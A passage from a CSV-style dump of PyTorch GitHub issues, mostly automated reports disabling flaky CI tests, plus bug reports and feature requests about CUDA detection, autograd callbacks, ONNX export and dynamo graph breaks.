DISABLED test_activations_gelu__cpu (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_activations_gelu__cpu&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18238123500).

Over the past 3 hours, it has been determined flaky in 16 workflow(s) with 48 failures and 16 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_activations_gelu__cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_meta_outplace_nn_functional_margin_ranking_loss_cpu_int8 (__main__.TestMetaCPU) triaged module: flaky-tests skipped module: primTorch oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_meta_outplace_nn_functional_margin_ranking_loss_cpu_int8&suite=TestMetaCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18237784716).

Over the past 3 hours, it has been determined flaky in 16 workflow(s) with 48 failures and 16 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_meta_outplace_nn_functional_margin_ranking_loss_cpu_int8`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_meta.py`

cc @ezyang @mruberry @Lezcano @peterbell10 @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
Bug Report No Version Of Pytorch for cuda 12.3 needs reproduction,"If you have a question or would like help and support, please ask at our
[forums](https://discuss.pytorch.org/).

If you are submitting a feature request, please preface the title with [feature request].
If you are submitting a bug report, please fill in the following details.

## Issue description

since updating both my gpu driver and cuda to cuda 12.3 pytorch isnt detecting my gpu and is complaing that cuda is not availible and that i dont have supported gpu when it was working just fine my gpu is a rtx 3060 yes with cuda support

## Code example

torch.is.availible()

## System Info
Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/main/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

- PyTorch or Caffe2: pytorch
- How you installed PyTorch (conda, pip, source):
- Build command you used (if compiling from source):
- OS: windows 10
- PyTorch version: latest available
- Python version:
- CUDA/cuDNN version: latest
- GPU models and configuration:
- GCC version (if compiling from source):
- CMake version:
- Versions of any other relevant libraries: cuda toolkit 12.3
",False
DISABLED test_layer_norm_backward_size_1024_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_layer_norm_backward_size_1024_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18201273111).

Over the past 3 hours, it has been determined flaky in 19 workflow(s) with 57 failures and 19 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_layer_norm_backward_size_1024_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_tensor_dtype_complex (__main__.CommTest) oncall: distributed module: flaky-tests skipped,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_tensor_dtype_complex&suite=CommTest) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18199906633).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 2 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_tensor_dtype_complex`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `distributed/test_c10d_ucc.py`

cc @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @osalpekar @jiayisuse @H-Huang @kwen2501 @awgu @penguinwu",False
[Autograd] `Variable._execution_engine.queue_callback` swallows error message module: autograd triaged,"

```
from typing import Any, Callable

import torch
import torch.nn as nn
from torch.autograd import Variable
from torch.distributed.utils import _apply_to_tensors


def hook(*args, **kwargs):
    assert 0, ""Hello world!""


def register_backward_hook(output: Any, hook: Callable):
    if not torch.is_grad_enabled():
        return output

    def _register_hook(tensor: torch.Tensor):
        if tensor.requires_grad:
            tensor.register_hook(
                lambda *args, **kwargs: Variable._execution_engine.queue_callback(hook)
            )
        return tensor

    return _apply_to_tensors(_register_hook, output)


model = nn.Sequential(
    nn.Linear(3, 3, device=""cuda""), nn.ReLU(), nn.Linear(3, 3, device=""cuda"")
)
out = model(torch.randn(2, 3, device=""cuda""))
register_backward_hook(out, hook)
out.sum().backward()
```

`Hello world!` is not printed:
```
Traceback (most recent call last):
  File ""/data/users/andgu/sandbox/non_distributed/repro_autograd_error.py"", line 32, in <module>
    out.sum().backward()
  File ""/data/users/andgu/pytorch/torch/_tensor.py"", line 503, in backward
    torch.autograd.backward(
  File ""/data/users/andgu/pytorch/torch/autograd/__init__.py"", line 254, in backward
    Variable._execution_engine.run_backward(  # Calls into the C++ engine to run the backward pass
SystemError: <built-in method run_backward of torch._C._EngineBase object at 0x7f762e58bd40> returned NULL without setting an exception
```

cc @ezyang @albanD @zou3519 @gqchen @pearu @nikitaved @soulitzer @Lezcano @Varal7",False
DISABLED test_layer_norm_backward_size_1023_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_layer_norm_backward_size_1023_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18185884821).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_layer_norm_backward_size_1023_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_layer_norm_backward_edge_case_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_layer_norm_backward_edge_case_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18173611830).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_layer_norm_backward_edge_case_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_out_warning__refs_arange_cpu (__main__.TestCommonCPU) triaged module: flaky-tests skipped module: unknown oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_out_warning__refs_arange_cpu&suite=TestCommonCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18173341818).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 2 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_out_warning__refs_arange_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_ops.py`

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
Support for Exporting 'aten::fft_rfft' to ONNX module: onnx triaged,"### üöÄ The feature, motivation and pitch

I want to export a torch model to ONNX. My model uses torch.fft.rfft and torch.fft.rfftfreq. However, I got the following erroe:

""UnsupportedOperatorError: Exporting the operator 'aten::fft_rfft' to ONNX opset version 14 is not supported. Please feel free to request support or submit a pull request on PyTorch GitHub: https://github.com/pytorch/pytorch/issues.""

I tried the latest opset version 17, but this operation is still not supportd.

### Alternatives

_No response_

### Additional context

_No response_",False
torch.distributed.rpc example errors oncall: distributed,"### üìö The doc issue

https://pytorch.org/docs/stable/rpc.html#rpc

Usage of @torch.jit.script may not work with the current version of PyTorch and may result in type mismatch exceptions.

### Suggest a potential alternative/fix

fixed in #112367 

cc @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @osalpekar @jiayisuse @H-Huang @kwen2501 @awgu @penguinwu",False
typo in example of `torch.linalg.solve_triangular` ,"### üìö The doc issue

Hello, during  learning pytorch, I noticed a typo in the example provided in `torch.linalg.solve_triangular`. In first example:
```py
A = torch.randn(3, 3).triu_()
b = torch.randn(3, 4) # here need upper B
X = torch.linalg.solve_triangular(A, B, upper=True)
torch.allclose(A @ X, B)
```
url: https://pytorch.org/docs/stable/generated/torch.linalg.solve_triangular.html#torch-linalg-solve-triangular

source code may here:  https://github.com/pytorch/pytorch/blob/main/torch/linalg/__init__.py#L2244-L2246

### Suggest a potential alternative/fix

_No response_",False
DISABLED test_layer_norm_backward_5d_size_4_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_layer_norm_backward_5d_size_4_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18163699213).

Over the past 3 hours, it has been determined flaky in 4 workflow(s) with 12 failures and 4 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_layer_norm_backward_5d_size_4_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
Access triton code generated by torchinductor backend ,"### üöÄ The feature, motivation and pitch

would look to take a look at the triton code generated by torchinductor when using `torch.compile` for debugging purposes, is there a way to do that?

### Alternatives

_No response_

### Additional context

_No response_",False
DISABLED test_derpy_nn_module_usage (__main__.MiscTests) triaged module: flaky-tests skipped module: dynamo,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_derpy_nn_module_usage&suite=MiscTests) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18132406858).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 2 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_derpy_nn_module_usage`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `dynamo/test_misc.py`

cc @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @chenyang78 @aakhundov @kadeng",False
DISABLED test_layer_norm_backward_5d_size_32_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_layer_norm_backward_5d_size_32_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18126685567).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 9 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_layer_norm_backward_5d_size_32_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_layer_norm_backward_5d_size_2_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_layer_norm_backward_5d_size_2_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18112962821).

Over the past 3 hours, it has been determined flaky in 4 workflow(s) with 12 failures and 4 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_layer_norm_backward_5d_size_2_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_layer_norm_backward_5d_size_128_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_layer_norm_backward_5d_size_128_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18105523198).

Over the past 3 hours, it has been determined flaky in 5 workflow(s) with 15 failures and 5 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_layer_norm_backward_5d_size_128_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
[dynamo] standard_test() is buggy triaged oncall: pt2 module: dynamo,"I noticed this while trying to add types to `torch/_dynamo/testing.py`. This line always throws an error due to the call being passed the wrong number of arguments:

https://github.com/pytorch/pytorch/blob/94e90c199c6abb188d1d86244621b9e94e43598c/torch/_dynamo/testing.py#L255

However, fixing that causes tests to fail, because this line was previously never executed:

https://github.com/pytorch/pytorch/blob/94e90c199c6abb188d1d86244621b9e94e43598c/torch/_dynamo/testing.py#L258

I'm not sure whether the test failures are bogus.

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519 @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @chenyang78 @aakhundov @kadeng",False
DISABLED test_indexing_backward_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_indexing_backward_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18100110014).

Over the past 3 hours, it has been determined flaky in 9 workflow(s) with 27 failures and 9 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_indexing_backward_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_gelu_backward_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_gelu_backward_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18083003357).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 9 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_gelu_backward_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_cond (__main__.MiscTests) triaged module: flaky-tests skipped module: dynamo,"Platforms: linux, slow

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_cond&suite=MiscTests) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18083697881).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 2 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_cond`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `dynamo/test_misc.py`

cc @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @chenyang78 @aakhundov @kadeng",False
don't graph break for assignment of mutables in higher order op's function triaged oncall: pt2 module: dynamo,"### üöÄ The feature, motivation and pitch

Right now we cannot do a aliasing in the inner function of higher order op, this could be an assignment such as `x = args` or could be a `for arg in args`, the latter would be very useful in supporting pytree.tree_flatten inside the inner function.
```python
import torch
from torch._higher_order_ops.wrap import wrap

@torch.compile(backend=""eager"", fullgraph=True)
def f(args):
    def inner_f(args):
        x = args # assign a tuple to a local var causes graph break
        # for arg in args # is also not allowed.
        return x
    return wrap(inner_f, args)

args = ((torch.ones(1), torch.ones(1)),)
f(args)
```
It produces errors like below:
```
[2023-10-26 09:47:32,794] [0/0] torch._dynamo.variables.higher_order_ops: [WARNING] speculate_subgraph: while introspecting wrap, we were unable to trace function `NestedUserFunctionVariable` into a single graph. This means that Dynamo was unable to prove safety for this API and will fall back to eager-mode PyTorch, which could lead to a slowdown.
[2023-10-26 09:47:32,794] [0/0] torch._dynamo.variables.higher_order_ops: [ERROR] HigherOrderOperator: Mutating a variable not in the current scope (replace_all)
Traceback (most recent call last):
  File ""/home/yidi/local/pytorch/torch/_dynamo/variables/higher_order_ops.py"", line 214, in speculate_subgraph
    output = f.call_function(tx, args, sub_kwargs)
  File ""/home/yidi/local/pytorch/torch/_dynamo/variables/functions.py"", line 90, in call_function
    return tx.inline_user_function_return(
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 622, in inline_user_function_return
    result = InliningInstructionTranslator.inline_call(self, fn, args, kwargs)
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 2255, in inline_call
    return cls.inline_call_(parent, func, args, kwargs)
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 2387, in inline_call_
    tracer.run()
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 751, in run
    and self.step()
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 714, in step
    getattr(self, inst.opname)(inst)
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 816, in STORE_FAST
    loaded_vt = loaded_vt.rename(self, name)
  File ""/home/yidi/local/pytorch/torch/_dynamo/variables/base.py"", line 345, in rename
    return tx.replace_all(self, new_vt)
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 2530, in replace_all
    self.check_replace_is_safe(oldvar, newvar)
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 2525, in check_replace_is_safe
    unimplemented(
  File ""/home/yidi/local/pytorch/torch/_dynamo/exc.py"", line 184, in unimplemented
    raise Unsupported(msg)
torch._dynamo.exc.Unsupported: HigherOrderOperator: Mutating a variable not in the current scope (replace_all)

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File ""/home/yidi/local/pytorch/repro.py"", line 14, in <module>
    f(args)
  File ""/home/yidi/local/pytorch/torch/_dynamo/eval_frame.py"", line 410, in _fn
    return fn(*args, **kwargs)
  File ""/home/yidi/local/pytorch/torch/_dynamo/eval_frame.py"", line 558, in catch_errors
    return callback(frame, cache_entry, hooks, frame_state)
  File ""/home/yidi/local/pytorch/torch/_dynamo/convert_frame.py"", line 148, in _fn
    return fn(*args, **kwargs)
  File ""/home/yidi/local/pytorch/torch/_dynamo/convert_frame.py"", line 402, in _convert_frame_assert
    return _compile(
  File ""/home/yidi/local/pytorch/torch/_dynamo/convert_frame.py"", line 610, in _compile
    guarded_code = compile_inner(code, one_graph, hooks, transform)
  File ""/home/yidi/local/pytorch/torch/_dynamo/utils.py"", line 221, in time_wrapper
    r = func(*args, **kwargs)
  File ""/home/yidi/local/pytorch/torch/_dynamo/convert_frame.py"", line 527, in compile_inner
    out_code = transform_code_object(code, transform)
  File ""/home/yidi/local/pytorch/torch/_dynamo/bytecode_transformation.py"", line 1028, in transform_code_object
    transformations(instructions, code_options)
  File ""/home/yidi/local/pytorch/torch/_dynamo/convert_frame.py"", line 497, in transform
    tracer.run()
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 2127, in run
    super().run()
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 751, in run
    and self.step()
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 714, in step
    getattr(self, inst.opname)(inst)
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 405, in wrapper
    return inner_fn(self, inst)
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 1147, in CALL_FUNCTION
    self.call_function(fn, args, {})
  File ""/home/yidi/local/pytorch/torch/_dynamo/symbolic_convert.py"", line 586, in call_function
    self.push(fn.call_function(self, args, kwargs))
  File ""/home/yidi/local/pytorch/torch/_dynamo/variables/higher_order_ops.py"", line 1216, in call_function
    p_args, p_kwargs, example_value, treespec = self.create_wrapped_node(
  File ""/home/yidi/local/pytorch/torch/_dynamo/variables/higher_order_ops.py"", line 1176, in create_wrapped_node
    ) = speculate_subgraph(
  File ""/home/yidi/local/pytorch/torch/_dynamo/variables/higher_order_ops.py"", line 288, in speculate_subgraph
    raise Unsupported(
torch._dynamo.exc.Unsupported: speculate_subgraph: while introspecting wrap, we were unable to trace function `NestedUserFunctionVariable` into a single graph. This means that Dynamo was unable to prove safety for this API and will fall back to eager-mode PyTorch, which could lead to a slowdown. Scroll up for the stack trace of the initial exception. The reason was: HigherOrderOperator: Mutating a variable not in the current scope (replace_all)

from user code:
   File ""/home/yidi/local/pytorch/repro.py"", line 10, in f
    return wrap(inner_f, args)

Set TORCH_LOGS=""+dynamo"" and TORCHDYNAMO_VERBOSE=1 for more information


You can suppress this exception and fall back to eager by setting:
    import torch._dynamo
    torch._dynamo.config.suppress_errors = True
```


### Alternatives

_No response_

### Additional context

_No response_

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519 @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @chenyang78 @aakhundov @kadeng",False
DISABLED test_triton_bsr_scatter_mm_blocksize_16_cuda_float16 (__main__.TestSparseCompressedTritonKernelsCUDA) module: sparse triaged module: flaky-tests skipped,"Platforms: linux, slow

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_triton_bsr_scatter_mm_blocksize_16_cuda_float16&suite=TestSparseCompressedTritonKernelsCUDA) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18075318735).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 3 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_triton_bsr_scatter_mm_blocksize_16_cuda_float16`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_sparse_csr.py`

cc @alexsamardzic @nikitaved @pearu @cpuhrsch @amjames @bhosmer",False
DISABLED test_triton_bsr_scatter_mm_blocksize_16_cuda_bfloat16 (__main__.TestSparseCompressedTritonKernelsCUDA) module: sparse triaged module: flaky-tests skipped,"Platforms: linux, slow

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_triton_bsr_scatter_mm_blocksize_16_cuda_bfloat16&suite=TestSparseCompressedTritonKernelsCUDA) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18075318735).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 3 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_triton_bsr_scatter_mm_blocksize_16_cuda_bfloat16`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_sparse_csr.py`

cc @alexsamardzic @nikitaved @pearu @cpuhrsch @amjames @bhosmer",False
DISABLED test_dropout_backward_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_dropout_backward_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18072901313).

Over the past 3 hours, it has been determined flaky in 4 workflow(s) with 12 failures and 4 successes.

**Debugging instructions (after clicking on the recent samples link):**
